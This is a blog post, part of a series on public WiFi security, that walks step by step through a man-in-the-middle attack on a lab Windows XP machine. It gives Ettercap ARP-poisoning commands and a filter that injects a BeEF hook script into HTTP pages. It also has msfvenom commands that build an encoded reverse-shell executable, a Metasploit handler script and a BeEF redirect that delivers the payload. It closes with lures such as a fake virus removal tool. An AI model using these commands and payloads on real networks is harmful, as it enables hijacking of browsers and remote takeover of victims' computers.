---
layout: post
title:  "The Myths Of Public WiFi - Pt4 If I See The Lock In My Browser's URL, Does That Mean I'm Safe?"
date:   2018-11-22 14:56:03 -0400
categories: jekyll update
---

<br>[Part 3 (Can Your Private Information Be Stolen?)][part-3]

<b>Legal Disclosure: Don't do this on networks other than your own without written consent from the network administrator. Otherwise, you would be committing an illegal act.</b>

In our last article, we learned how to spoof domain names and redirect them to malicious content. My previous articles have mentioned that the previous attacks will not work on HTTPS websites. The lock in the URL bar means the webpage is using HTTPS, so it should follow that you would be safe right? Even if a website displays HTTPS in the browser's visible URL bar, the page itself could be requesting multiple modules with HTTP which can be overwritten by the attacker. All unencrypted traffic is at risk. Unencrypted traffic on non-standard services is slightly safer. The attacker needs to know how to rewrite the application's traffic in meaningful ways. The attacker will also need to develop an exploit as well. As a potential victim, you should also consider probability of an attacker being prepared for such an attack in ADDITION to the probobility of being targeted.

<b>Notice Before You Begin</b>

This tutorial will be using Ettercap filters. Ettercap filters have had a 5-year history of intermittent success. The internet is littered with unresolved forum posts regarding this issue. If you can't get them to work, then you are not alone. No one can figure out why they break. Some claim VM's are the cause, but as we have seen on their [Github Page][github], people have had success with VMs. I can not get it to work on my personal VM in Windows 10, but I can get it to work on my Dell laptop using Kali as my native operating system. There are alternatives such as [Mitmproxy][mitmproxy] but we should attempt the standard toolset at least once.

<b>Roadmap</b>

-Install Chrome in Windows XP.

-Create a malicious executable.

-Create a filter for Ettercap to replace HTML code in HTTP streams.

-Activate Metasploit and wait for the user to download the executable.

-Poison the target.

-Use Beef to send the executable once the victim downloads your modified HTML code.

-If the victim runs the executable, then use Metasploit to hack his computer.

<b>Install Chrome in Windows XP</b>

We will be using a program called Beef to execute the attack. Beef requires JQuery and the default version of Internet Explorer will not supply it. In order to remedy this, we will simply need to download Chrome on Internet Explorer.

<b>Setting Up Initial Files</b>

In order for our .bashrc script to work, we need to start by creating a few directories and files. Start by opening a new terminal window and entering the following commands

{% highlight ruby %}
mkdir filters
touch ~/filters/http
#Create a folder for ettercap filters and a file for http
mkdir msfscripts
touch ~/msfscripts/payload_http.rc
#Create a folder for metasploit scripts and a file for the http listener
sudo cp /etc/ettercap/etter.conf /etc/ettercap/etter.beef.conf
#Create a config file for ettercap that allows us to redirect to beef.
{% endhighlight %}

Start by configuring the etter.beef.conf file

{% highlight ruby %}
sudo nano /etc/ettercap/etter.beef.conf
{% endhighlight %}

Now that we are inside the file, look for the following lines and change their value to zero

{% highlight ruby %}
ec_uid = 0                # nobody is the default
ec_gid = 0                # nobody is the default
{% endhighlight %}

This means Ettercap has the privilege to write data. The default is 65534 (nobody)

Now uncomment the last two lines in the "Linux" section

{% highlight ruby %}
#---------------
#     Linux 
#---------------

# if you use ipchains:
   #redir_command_on = "ipchains -A input -i %iface -p tcp -s 0/0 -d 0/0 %port -j REDIRECT %rport"
   #redir_command_off = "ipchains -D input -i %iface -p tcp -s 0/0 -d 0/0 %port -j REDIRECT %rport"

# if you use iptables:
   redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"
   redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"
{% endhighlight %}

Save .bashrc with Ctrl+O and exit with Ctrl+X.

<b>Careate an HTTP filter for Ettercap</b>

Start by opening the newly created filter file

{% highlight ruby %}
nano ~/filters/http
{% endhighlight %}

Now copy and paste the code.

{% highlight ruby %}
if (ip.proto == TCP && tcp.dst == 80)
{
	if (search(DATA.data, "Accept-Encoding"))
	{
	replace("Accept-Encoding", "Accept-Nothing!"); 
	}
}
if (ip.proto == TCP && tcp.src == 80)
{
	if (search(DATA.data, "</head>"))
	{
	replace("</head>", "</head><script src="http://MYIP:3000/hook.js"></script> ");
	msg("BEEF Hooked");
	}
}
{% endhighlight %}

Save .bashrc with Ctrl+O and exit with Ctrl+X.

<b>Careate a Metasploit RC script</b>

Start by opening a new file file

{% highlight ruby %}
nano ~/msfscripts/payload_http.rc
{% endhighlight %}

Copy and paste the following

{% highlight ruby %}
use exploit/multi/handler
set payload windows/shell/reverse_tcp
set LHOST MYIP
set LPORT 3333
exploit
{% endhighlight %}

Save with Ctrl+O and exit with Ctrl+X.

<b>Making life easier with the .bashrc file</b>

Now open the .bashrc file and add the following two functions

{% highlight ruby %}
function inject_http ()
{
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=$myIP LPORT=3333 -b "\x00" -e x86/shikata_ga_nai -f exe -o ~/payload.exe;
#msfvenom: Generates executables that provide backdoor access
#-a: Hardware architecture. Almost always x86
#--platform: Operating system to develop for
#-p: Type of attack. In this case, reverse_tcp
#LHOST: Out computer
#LPORT: Source port
#-b: Invalid byte (explination beyond the scope of tutorial
#-e: encoding: Almost always x86/shikata_ga_nai for exe's
#-f: Executible format. Always EXE for Windows.
#-o: File output
sudo mv ~/payload.exe /var/www/html/;
#Copy the payload to the webroot

sudo cp /etc/ettercap/etter.beef.conf /etc/ettercap/etter.conf;
#replace the active etter.conf file
sed -i 's/MYIP/'$myIP'/g' ~/filters/http;
#Place your current local IP into the ettercap filter
sudo etterfilter ~/filters/http;
#Convert ettercap filter script to an ettercap readable format

sudo systemctl start apache2;
#Start apache
sudo ettercap -T -F ~/filters/filter.ef -M arp:remote /$targetIP// /$gateway$//;
#Then poison with -F (filter)
sudo systemctl stop apache2;
#Cleanup
}

function exploit_http ()
{
sed -i 's/MYIP/'$myIP'/g' ~/msfscripts/payload_http.rc;
#Place your current local IP into the rc script
msfconsole -r ~/msfscripts/payload_http.rc;
#Launch metasploit with the automated script
}
{% endhighlight %}

Save .bashrc with Ctrl+O and exit with Ctrl+X. Close terminal for the changes to take effect. At this point, the setup is complete. 

<b>Launch Metasploit</b>

We are at last ready to operate in the field. We will start by opening Metasploit and we will let it run in a separate terminal tab

{% highlight ruby %}
exploit_http
{% endhighlight %}

It will tell you the TCP session has started but it won't go any further. This is normal. It is simply "listening" for the victim to run the malware you are about to create.

<b>Operating In The Feild</b>

Beef is a program that will load in the payload that we need to generate. Start by opening Beef via command line.

{% highlight ruby %}
cd /usr/share/beef-xss
sudo ./beef
{% endhighlight %}

Go to your web browser and type in http://localhost:3000/ui/authentication

You should get a web browser that looks like the following image. Use these credentials

Username: beef
Password: beef

![image tooltip](/blog/images/beef/beef0.JPG)

Now you should launch create the payload and launch Ettercap. Thankfully we have it all in one command. Open up a new terminal tab alongside Metasploit.

{% highlight ruby %}
inject_http
{% endhighlight %}

Keep Ettercap running and go to your Windows XP Chrome browser. Go to an HTTP website like example.com and accept all the security warnings as if you were a clueless user.

watch your Beef window. You should notice your target IP appearing in the "Online Browsers" folder. Click the online IP, then click the command tab. Tons of folders should come up. The one we want to click on is Persistence. It's worth looking into all the options. I personally prefer the Foreground iFrame option, but we should stick with the Pop Under method in order to receive visual confirmation everything is working as intended. Once this is selected, click the "Execute" button in the bottom right.

![image tooltip](/blog/images/beef/beef1.JPG)

Allow the pop-ups in Chrome.

![image tooltip](/blog/images/beef/beef2.JPG)

Make sure the popup actually shows up in the bottom right-hand corner. This window will remain here even if we go to other websites.

![image tooltip](/blog/images/beef/beef3.JPG)

If the connection succeeded, then Beef should show a "Ready" checkmark near the bottom left. At any point, you can redirect the user to your payload. Go back to Beef's module tree and click Browser/Hooked Domains/Redirect Browser. In the Redirect URL field place http://192.168.1.4/payload.exe and hit "Execute" again.

![image tooltip](/blog/images/beef/beef4.JPG)


Your Internet Explorer browser should give you a prompt to run the EXE. Say run, then check your Metasploit window. Once the user clicks the executable, Metasploit should tell you that you have a shell session running. It may appear blank at first. Normally you could type 'shell' but in this case, we need to type 'python.'

![image tooltip](/blog/images/beef/beef5.JPG)

<b>Conclusion</b>

Even with Internet Explorer, the victim still had to click through several popup windows in order to be tricked into running an executable. If you are attacking with Beef, then there are many ways to disguise this. Make Beef redirect the user to a website claiming to be a virus protection service and tell them the install file is a "Virus removal tool." Or you could discuss the redirected site as a host for celebrity nudes and it requires a special "HD_XXX_video_player.exe" Even if we weren't using Beef, then we have demonstrated that an attacker can write ANYTHING. This can include javascript or Flash exploits that the victim's browser may not be prepared for. There is a lot of damage that could potentially be done with HTTP even if the victim's browser displays an HTTPS connection.

[Part 5 (If I See The Lock In My Browser's URL, Does That Mean I'm Safe?)][part-5]

[part-3]: https://danielloosec.github.io/blog/jekyll/update/2018/11/22/PublicWifiMyths_Part_3.html
[part-5]: https://danielloosec.github.io/blog/jekyll/update/2018/11/22/PublicWifiMyths_Part_5.html
[github]: https://github.com/Ettercap/ettercap/issues/69
[mitmproxy]: http://pankajmalhotra.com/Injecting-Javascript-In-HTML-Content-Using-MITM-Proxy
